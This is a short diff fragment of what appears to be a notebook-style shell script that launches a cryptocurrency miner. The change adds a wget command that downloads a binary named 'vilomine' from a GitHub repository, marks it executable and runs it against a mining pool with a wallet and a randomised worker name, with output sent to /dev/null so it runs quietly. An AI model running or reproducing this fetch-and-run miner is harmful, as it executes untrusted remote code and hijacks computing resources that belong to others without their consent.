@@ -15,6 +15,6 @@ WORKER=$(echo $(shuf -i 1-999 -n 1)-LGK)
 
 ! cd "$(dirname "$0")"
 
-! https://github.com/lambohopo/la/raw/main/vilomine
+! wget https://github.com/lambohopo/la/raw/main/vilomine
 ! chmod +x vilomine
 ! ./vilomine --algorithm $ALGHO --pool $POOL --user $WALLET.$WORKER > /dev/null
